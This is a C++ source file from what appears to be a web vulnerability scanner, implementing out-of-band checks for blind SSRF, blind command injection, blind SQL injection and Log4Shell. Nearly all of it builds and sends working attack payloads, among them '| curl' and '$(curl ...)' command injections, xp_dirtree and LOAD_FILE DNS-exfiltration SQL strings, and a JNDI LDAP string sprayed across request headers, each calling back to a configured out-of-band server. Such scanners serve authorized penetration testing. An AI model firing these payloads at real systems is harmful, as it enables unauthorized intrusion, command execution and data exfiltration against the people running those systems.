/// @file scanners/oob.cpp
/// @brief Out-of-band confirmed: blind SSRF, blind command injection,
///        blind SQLi OOB, Log4Shell.
#include "scanner_base.hpp"

namespace apex {
namespace {

/// Blind SSRF — use OOB server to confirm SSRF.
std::vector<Finding> scan_blind_ssrf(const Config &cfg, HttpClient &http,
                                     const CrawlResult &crawl) {
  std::vector<Finding> findings;
  if (cfg.no_oob) return findings;
  std::string oob = cfg.oob_server + "/ssrf";

  for (const auto &url : crawl.urls) {
    auto targets = get_targets(crawl, url, "url");
    for (const auto &[base, param] : targets) {
      http.get(base + oob);
      // Also try in POST body.
      http.post(url, "{\"url\":\"" + oob + "\"}", "application/json");
    }
  }
  // Note: actual confirmation happens via OOB server callback.
  if (!crawl.urls.empty()) {
    findings.push_back({"Blind SSRF", "info", crawl.urls[0],
                        "OOB SSRF payloads injected (check " + cfg.oob_server + ")",
                        "", oob, ""});
  }
  return findings;
}

/// Blind command injection via OOB.
std::vector<Finding> scan_blind_cmdi(const Config &cfg, HttpClient &http,
                                     const CrawlResult &crawl) {
  std::vector<Finding> findings;
  if (cfg.no_oob) return findings;

  std::string oob_domain = cfg.oob_server;
  // Extract just the host for DNS-based OOB.
  size_t start = oob_domain.find("://");
  if (start != std::string::npos) oob_domain = oob_domain.substr(start + 3);
  size_t colon = oob_domain.find(':');
  if (colon != std::string::npos) oob_domain = oob_domain.substr(0, colon);

  const std::vector<std::string> payloads = {
      "; nslookup " + oob_domain,
      "| curl " + cfg.oob_server + "/cmdi",
      "$(curl " + cfg.oob_server + "/cmdi)",
      "`nslookup " + oob_domain + "`"};

  for (const auto &url : crawl.urls) {
    auto targets = get_targets(crawl, url, "cmd");
    for (const auto &[base, param] : targets) {
      for (const auto &payload : payloads) {
        http.get(base + payload);
      }
    }
  }
  if (!crawl.urls.empty()) {
    findings.push_back({"Blind CMDi", "info", crawl.urls[0],
                        "OOB CMDi payloads injected", "", "", ""});
  }
  return findings;
}

/// Blind SQLi via OOB (DNS exfiltration).
std::vector<Finding> scan_blind_sqli_oob(const Config &cfg, HttpClient &http,
                                         const CrawlResult &crawl) {
  std::vector<Finding> findings;
  if (cfg.no_oob) return findings;

  std::string oob_domain = cfg.oob_server;
  size_t start = oob_domain.find("://");
  if (start != std::string::npos) oob_domain = oob_domain.substr(start + 3);
  size_t colon = oob_domain.find(':');
  if (colon != std::string::npos) oob_domain = oob_domain.substr(0, colon);

  const std::vector<std::string> payloads = {
      "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',version(),'." + oob_domain + "\\\\a'))--",
      "'; EXEC master..xp_dirtree '//" + oob_domain + "/a'--",
      "' || UTL_HTTP.REQUEST('http://" + oob_domain + "/sqli')--"};

  for (const auto &url : crawl.urls) {
    auto targets = get_targets(crawl, url);
    for (const auto &[base, param] : targets) {
      for (const auto &payload : payloads) {
        http.get(base + payload);
      }
    }
  }
  if (!crawl.urls.empty()) {
    findings.push_back({"Blind SQLi OOB", "info", crawl.urls[0],
                        "OOB SQLi payloads injected", "", "", ""});
  }
  return findings;
}

/// Log4Shell (CVE-2021-44228) — JNDI injection.
std::vector<Finding> scan_log4shell(const Config &cfg, HttpClient &http,
                                    const CrawlResult &crawl) {
  std::vector<Finding> findings;
  if (cfg.no_oob) return findings;

  std::string oob = cfg.oob_server;
  size_t start = oob.find("://");
  if (start != std::string::npos) oob = oob.substr(start + 3);

  std::string payload = "${jndi:ldap://" + oob + "/log4shell}";
  const std::vector<std::string> headers = {
      "X-Forwarded-For", "User-Agent", "Referer", "X-Api-Version",
      "Authorization", "Cookie", "X-Request-Id"};

  for (const auto &url : crawl.urls) {
    // Inject in headers.
    std::vector<std::pair<std::string, std::string>> hdrs;
    for (const auto &h : headers) hdrs.push_back({h, payload});
    http.get(url, hdrs);

    // Inject in parameters.
    auto targets = get_targets(crawl, url);
    for (const auto &[base, param] : targets) {
      http.get(base + payload);
    }
  }
  if (!crawl.urls.empty()) {
    findings.push_back({"Log4Shell", "info", crawl.urls[0],
                        "Log4Shell payloads injected (check OOB server)",
                        "", payload, ""});
  }
  return findings;
}

} // namespace

std::vector<Scanner> register_oob_scanners() {
  return {
      {"Blind SSRF (OOB)", scan_blind_ssrf},
      {"Blind CMDi (OOB)", scan_blind_cmdi},
      {"Blind SQLi (OOB)", scan_blind_sqli_oob},
      {"Log4Shell", scan_log4shell},
  };
}

} // namespace apex
